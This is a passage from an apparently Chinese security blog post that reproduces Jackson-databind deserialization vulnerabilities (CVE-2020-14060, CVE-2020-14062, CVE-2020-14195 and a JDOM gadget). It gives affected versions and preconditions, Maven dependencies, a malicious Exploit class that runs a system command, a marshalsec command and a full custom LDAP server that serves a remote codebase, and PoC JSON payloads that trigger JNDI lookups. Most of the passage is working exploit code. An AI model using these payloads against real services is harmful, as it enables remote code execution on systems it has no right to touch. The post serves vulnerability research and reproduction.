class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>起一个web服务器，并将编译的Exploit.class放入根目录中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server <span class="number">8080</span></span><br></pre></td></tr></table></figure><p>Exploit.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>marshalsec开启LDAP服务 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://localhost:8080/<span class="comment">#Exploit</span></span><br></pre></td></tr></table></figure><p>Poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Poc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line"></span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line"></span><br><span class="line">        String json = <span class="string">"[\"org.apache.xbean.propertyeditor.JndiConverter\", &#123;\"asText\":\"ldap://localhost:1389/Exploit\"&#125;]"</span>;</span><br><span class="line"></span><br><span class="line">        mapper.readValue(json, Object<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="CVE-2020-14060"><a href="#CVE-2020-14060" class="headerlink" title="CVE-2020-14060"></a>CVE-2020-14060</h1><p>影响范围   </p><ul><li>jackson-databind before 2.9.10.4</li><li>jackson-databind before 2.8.11.6</li><li>jackson-databind before 2.7.9.7</li></ul><p>利用条件   </p><ul><li>开启enableDefaultTyping()</li><li>使用了org.apache.drill.exec:drill-jdbc-all第三方依赖</li></ul><p>pom.xml</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;2.9.10.4&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.apache.drill.exec&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;drill-jdbc-all&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;1.4.0&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.slf4j&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;slf4j-nop&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;1.7.2&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;!-- https:<span class="comment">//mvnrepository.com/artifact/javax.transaction/jta --&gt;</span></span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;javax.transaction&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;jta&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;1.1&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">     &lt;dependency&gt;</span><br><span class="line">         &lt;groupId&gt;com.unboundid&lt;/groupId&gt;</span><br><span class="line">          &lt;artifactId&gt;unboundid-ldapsdk&lt;/artifactId&gt;</span><br><span class="line">          &lt;version&gt;3.1.1&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br><span class="line"></span><br><span class="line">  &lt;/dependencies&gt;</span><br><span class="line">  &lt;!-- https:<span class="comment">//mvnrepository.com/artifact/org.aoju/bus-core --&gt;</span></span><br></pre></td></tr></table></figure><p>PS：这里的漏洞所使用的库包需要在1.4版本才可以，之后没有该漏洞类，而目前最新的已经是1.17.0了，所以总体来说较为鸡肋~     </p><p>启动web服务，并放入编译好的badClassName.class文件         </p><p>badClassName.java    </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">badClassName</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="title">badClassName</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>启动LDAPServer 服务   </p><p>LDAPServer.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LDAPServer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String LDAP_BASE = <span class="string">"dc=example,dc=com"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        String url = <span class="string">"http://127.0.0.1:8888/#badClassName"</span>;</span><br><span class="line">        <span class="keyword">int</span> port = <span class="number">1389</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            InMemoryDirectoryServerConfig config = <span class="keyword">new</span> InMemoryDirectoryServerConfig(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> InMemoryListenerConfig(</span><br><span class="line">                    <span class="string">"listen"</span>,</span><br><span class="line">                    InetAddress.getByName(<span class="string">"0.0.0.0"</span>),</span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> OperationInterceptor(<span class="keyword">new</span> URL(url)));</span><br><span class="line">            InMemoryDirectoryServer ds = <span class="keyword">new</span> InMemoryDirectoryServer(config);</span><br><span class="line">            System.out.println(<span class="string">"Listening on 0.0.0.0:"</span> + port);</span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title">InMemoryOperationInterceptor</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">OperationInterceptor</span> <span class="params">( URL cb )</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &#123;<span class="doctag">@inheritDoc</span>&#125;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> </span>&#123;</span><br><span class="line">            String base = result.getRequest().getBaseDN();</span><br><span class="line">            Entry e = <span class="keyword">new</span> Entry(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException </span>&#123;</span><br><span class="line">            URL turl = <span class="keyword">new</span> URL(<span class="keyword">this</span>.codebase, <span class="keyword">this</span>.codebase.getRef().replace(<span class="string">'.'</span>, <span class="string">'/'</span>).concat(<span class="string">".class"</span>));</span><br><span class="line">            System.out.println(<span class="string">"Send LDAP reference result for "</span> + base + <span class="string">" redirecting to "</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">"javaClassName"</span>, <span class="string">"Exploit"</span>);</span><br><span class="line">            String cbstring = <span class="keyword">this</span>.codebase.toString();</span><br><span class="line">            <span class="keyword">int</span> refPos = cbstring.indexOf(<span class="string">'#'</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line">            e.addAttribute(<span class="string">"javaCodeBase"</span>, cbstring);</span><br><span class="line">            e.addAttribute(<span class="string">"objectClass"</span>, <span class="string">"javaNamingReference"</span>);</span><br><span class="line">            e.addAttribute(<span class="string">"javaFactory"</span>, <span class="keyword">this</span>.codebase.getRef());</span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> LDAPResult(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>POC:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Poc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line"></span><br><span class="line">        String payload = <span class="string">"[\"oadd.org.apache.xalan.lib.sql.JNDIConnectionPool\",&#123;\"jndiPath\":\"ldap://127.0.0.1:1389/badClassName\"&#125;]"</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Object obj = mapper.readValue(payload, Object<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">            mapper.writeValueAsString(obj);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后运行该程序，成功执行命令，弹出计算器：</p><h1 id="CVE-2020-14062"><a href="#CVE-2020-14062" class="headerlink" title="CVE-2020-14062"></a>CVE-2020-14062</h1><p>影响范围</p><ul><li>jackson-databind before 2.9.10.4</li><li>jackson-databind before 2.8.11.6</li><li>jackson-databind before 2.7.9.7</li></ul><p>利用条件</p><ul><li>开启enableDefaultTyping()</li><li>使用了com.sun.xml.parsers:jaxp-ri第三方依赖</li></ul><p>漏洞复现</p><p>pom.xml </p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;2.9.10.4&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;com.sun.xml.parsers&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;jaxp-ri&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;1.4&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.slf4j&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;slf4j-nop&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;1.7.2&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;!-- https:<span class="comment">//mvnrepository.com/artifact/javax.transaction/jta --&gt;</span></span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;javax.transaction&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;jta&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;1.1&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;com.unboundid&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;unboundid-ldapsdk&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;3.1.1&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><p>Poc.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Poc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line">        String payload = <span class="string">"[\"com.sun.org.apache.xalan.internal.lib.sql.JNDIConnectionPool\",&#123;\"jndiPath\":\"ldap://127.0.0.1:1389/badClassName\"&#125;]"</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Object obj = mapper.readValue(payload, Object<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">            mapper.writeValueAsString(obj);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="CVE-2020-14195"><a href="#CVE-2020-14195" class="headerlink" title="CVE-2020-14195"></a>CVE-2020-14195</h1><p>影响范围</p><ul><li>jackson-databind before 2.9.10.4</li><li>jackson-databind before 2.8.11.6</li><li>jackson-databind before 2.7.9.7</li></ul><p>利用条件</p><ul><li>开启enableDefaultTyping()</li><li>使用了org.jsecurity.realm.jndi.JndiRealmFactory第三方依赖</li></ul><p>pom.xml</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;2.9.10.4&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- https:<span class="comment">//mvnrepository.com/artifact/org.jsecurity/jsecurity --&gt;</span></span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.jsecurity&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;jsecurity&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;0.9.0&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.slf4j&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;slf4j-nop&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;1.7.2&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;!-- https:<span class="comment">//mvnrepository.com/artifact/javax.transaction/jta --&gt;</span></span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;javax.transaction&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;jta&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;1.1&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;com.unboundid&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;unboundid-ldapsdk&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;3.1.1&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><p>漏洞Poc:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Poc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line">        String payload = <span class="string">"[\"org.jsecurity.realm.jndi.JndiRealmFactory\",&#123;\"jndiNames\":\"ldap://127.0.0.1:1389/badClassName\"&#125;]"</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Object obj = mapper.readValue(payload, Object<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">            mapper.writeValueAsString(obj);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Jackson-JDOM-XSLTransformer-Gadget"><a href="#Jackson-JDOM-XSLTransformer-Gadget" class="headerlink" title="Jackson JDOM XSLTransformer Gadget"></a>Jackson JDOM XSLTransformer Gadget</h1><p>影响范围</p><ul><li>Jackson 2.x ~2.9.9</li></ul><p>利用条件</p><ul><li>开启enableDefaultTyping</li><li>使用了JDOM 1.x 或 JDOM 2.x 依赖</li></ul><p>漏洞简介<br>在Jackson 2.x ~ Jackson 2.9.9,当开发人员在应用程序中通过ObjectMapper对象调用enableDefaultTyping方法并且服务端使用了JDOM 1.x 或 JDOM 2.x 依赖库时，攻击者可以发送恶意的JSON消息，读取远程服务器上的任意文件。</p><p>创建一个Meaven项目，在pom.xml文件中添加以下依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span 